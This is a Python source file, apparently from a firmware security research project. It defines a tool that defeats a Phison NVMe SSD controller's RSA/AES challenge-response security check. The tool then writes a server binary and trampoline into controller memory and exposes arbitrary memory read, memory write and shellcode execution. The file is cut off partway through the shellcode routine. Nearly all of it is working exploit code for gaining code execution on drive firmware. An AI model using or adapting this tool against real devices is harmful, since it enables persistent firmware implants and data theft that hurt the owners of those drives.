import time
import logging
from functools import reduce
from Crypto.Cipher import AES
from Crypto.Util.number import bytes_to_long, long_to_bytes
from common import nvme_common
from phison_executor import phison_executor_defs
from phison import phison_defs
from phison.phison_layer import PhisonLayer

logger = logging.getLogger(__name__)

class PhisonExecutor:
    """The Executor object through which RWX functionality is given.
    """
    def __init__(self, device_path : str):
        self._phison = PhisonLayer(device_path)
        fw_version = self._get_fw_version()
        if fw_version not in phison_executor_defs.PHISON_EXECUTOR_DEFS:
            raise phison_executor_defs.FirmwareUnsupportedException(
                f"FW version {fw_version} is currently unsupported!")

        self._fw_defs = phison_executor_defs.PHISON_EXECUTOR_DEFS[fw_version]

        with open(self._fw_defs['modulus_path'], 'rb') as f:
            self._modulus_bytes = f.read()

        with open(self._fw_defs['exp_path'], 'rb') as f:
            self._exp_bytes = f.read()

        self._enable_security_access()
        self._install_server()


    @staticmethod
    def _get_plain_challenge_part(challenge_data : bytes) -> bytes:
        """Get the plain part of the challenge.

        :param challenge_data: The challenge data.
        :type challenge_data: bytes
        :return: The plain part of the challenge.
        :rtype: bytes
        """
        assert len(challenge_data) == phison_defs.PHISON_SECURITY_CHALLENGE_SIZE
        return challenge_data[phison_defs.PHISON_SECURITY_CHALLENGE_ENCRYPTED_PART_SIZE : ]


    @staticmethod
    def _get_encrypted_challenge_part(challenge_data : bytes) -> bytes:
        """Get the encrypted part of the challenge.

        :param challenge_data: The challenge data.
        :type challenge_data: bytes
        :return: The encrypted part of the challenge.
        :rtype: bytes
        """
        assert len(challenge_data) == phison_defs.PHISON_SECURITY_CHALLENGE_SIZE
        return challenge_data[ : phison_defs.PHISON_SECURITY_CHALLENGE_ENCRYPTED_PART_SIZE]


    @staticmethod
    def _xor_buffers(buffer_a : bytes, buffer_b : bytes) -> bytes:
        """Perform a byte-by-byte xor operation on two byte sequences.

        :param buffer_a: First byte sequence.
        :type buffer_a: bytes
        :param buffer_b: Second byte sequence
        :type buffer_b: bytes
        :return: The result of xoring the byte sequences.
        :rtype: bytes
        """
        assert len(buffer_a) == len(buffer_b)
        return bytes([buffer_a[i] ^ buffer_b[i] for i in range(len(buffer_a))])


    @staticmethod
    def _split_to_key_size_chunks(some_bytes : bytes) -> list:
        """Split a byte sequence to chunks of the AES encryption key size.

        :param some_bytes: Input byte sequence.
        :type some_bytes: bytes
        :return: The list containing the key-sized chunks from input.
        :rtype: list
        """
        assert len(some_bytes) % phison_defs.PHISON_SECURITY_AES_KEY_SIZE == 0
        lst = []
        for i in range(0, len(some_bytes), phison_defs.PHISON_SECURITY_AES_KEY_SIZE):
            lst.append(some_bytes[i : i + phison_defs.PHISON_SECURITY_AES_KEY_SIZE])

        return lst


    def _get_fw_version(self) -> str:
        """Get controller FW version.

        :return: The FW version string.
        :rtype: str
        """
        identify_info = self._phison.phison_identify(
            nvme_common.NVMEIdentifyCNS.NVME_CNS_CONTROLLER,
            nvme_common.NVMECSI.NVME_CSI_NVM)
        return identify_info.fr[ : phison_defs.PHISON_FW_NAME_SIZE].decode('ascii')


    def _install_server(self):
        """Install the server binary into the controller.
        """
        with open(self._fw_defs['server_binary_path'], 'rb') as f:
            server_binary = f.read()

        with open(self._fw_defs['server_trampoline_binary_path'], 'rb') as f:
            trampoline_binary = f.read()

        server_base_address = self._fw_defs['server_base_address']
        trampoline_address = self._fw_defs['server_trampoline_address']

        logger.info("Writing server binary...")
        self.memory_write(server_base_address, server_binary)

        logger.info("Writing server trampoline...")
        self.memory_write(trampoline_address, trampoline_binary)

        # Wait some time for data cache to be flushed
        # Not very reliable, but we don't have a call primitive
        # for cache flush at this point
        time.sleep(10)


    def _compute_key(self, reconstructed_sequence : bytes) -> bytes:
        """Compute the response encryption key.

        :param reconstructed_sequence: The decrypted challenge.
        :type reconstructed_sequence: bytes
        :return: _description_
        :rtype: bytes
        """
        reconstructed_sequence_chunks = PhisonExecutor._split_to_key_size_chunks(
            reconstructed_sequence)
        reconstructed_result = reduce(PhisonExecutor._xor_buffers,
                                      reconstructed_sequence_chunks)

        modulus_bytes_chunks = PhisonExecutor._split_to_key_size_chunks(self._modulus_bytes)
        modulus_xor_result = reduce(PhisonExecutor._xor_buffers, modulus_bytes_chunks)

        return PhisonExecutor._xor_buffers(reconstructed_result, modulus_xor_result)

    def _generate_response(self, plain_challenge : bytes) -> bytes:
        """Generate a response for the challenge to be sent to controller.

        :param plain_challenge: The decrypted challenge.
        :type plain_challenge: bytes
        :return: The encrypted challenge to send to the controller.
        :rtype: bytes
        """
        scrambled_part_size = phison_defs.PHISON_SECURITY_CHALLENGE_ENCRYPTED_PART_SIZE
        reconstructed_part = plain_challenge[ : scrambled_part_size]

        key = self._compute_key(reconstructed_part)
        cipher = AES.new(key, AES.MODE_CBC, phison_defs.PHISON_SECURITY_AES_IV)
        plain_part = PhisonExecutor._get_plain_challenge_part(plain_challenge)
        return b''.join([cipher.encrypt(reconstructed_part), plain_part])

    def _enable_security_access(self):
        """Enable security access on the target controller.
        """
        logger.info("Initiaing phase 1 -> 2 routine.")
        self._phison.phison_security_move_phase2(self._fw_defs['security_fw'])
        logger.info("Initiaing phase 2 -> 3 routine.")
        self._phison.phison_security_move_phase3()
        logger.info("Initiating phase 3 -> 4 routine.")
        challenge = self._phison.phison_security_move_phase4()
        encrypted_part_bytes = self._get_encrypted_challenge_part(challenge)
        plain_part_bytes = self._get_plain_challenge_part(challenge)
        decrypted_part_bytes = self._solve_rsa_challenge(encrypted_part_bytes)
        plain_response = b''.join([decrypted_part_bytes, plain_part_bytes])
        encrypted_response = self._generate_response(plain_response)
        logger.info("Response generated. Sending response to controller (4 -> 5).")
        self._phison.phison_security_move_phase5(encrypted_response)
        logger.info("Security access granted.")

    def _solve_rsa_challenge(self, encrypted_part_bytes : bytes) -> bytes:
        """Decrypt the RSA-encrypted part of the challenge.

        :param encrypted_part_bytes: RSA-encrypted part from the challenge.
        :type encrypted_part_bytes: bytes
        :return: The decrypted data.
        :rtype: bytes
        """
        encrypted_part = bytes_to_long(encrypted_part_bytes)
        modulus = bytes_to_long(self._modulus_bytes)
        exp = bytes_to_long(self._exp_bytes)

        return long_to_bytes(pow(encrypted_part, exp, modulus))[::-1]


    def memory_read(self, address : int, size : int) -> bytes:
        """Read arbitrary memory from the controller.

        :param address: The address to start reading from.
        :type address: int
        :param size: The number of bytes to read.
        :type size: int
        :return: The bytes read.
        :rtype: bytes
        """
        return self._phison.phison_memory_read(address, size)

    def memory_write(self, address : int, data : bytes):
        """Write arbitrary memory on the controller.

        :param address: The address to start writing to.
        :type address: int
        :param data: The data to write.
        :type data: bytes
        """
        self._phison.phison_memory_write(address, data)

    def execute_shellcode(self, shellcode_binary_path : str) -> int:
        """Execute a shellcode binary on the controller.

        :param shellcode_binary_path: The path to the binary to execute.
        :type shellcode_binary_path: str
        :raises ValueError: For empty shellcode binary.
        :return: The return value returned for the shellcode.
        :rtype: int
        """
        with open(shellcode_binary_path, 'rb') as f:
            shellcode_binary = f.read()

        if len(shellcode_binary) == 0:
            raise ValueError("Empty shellcode provided!")
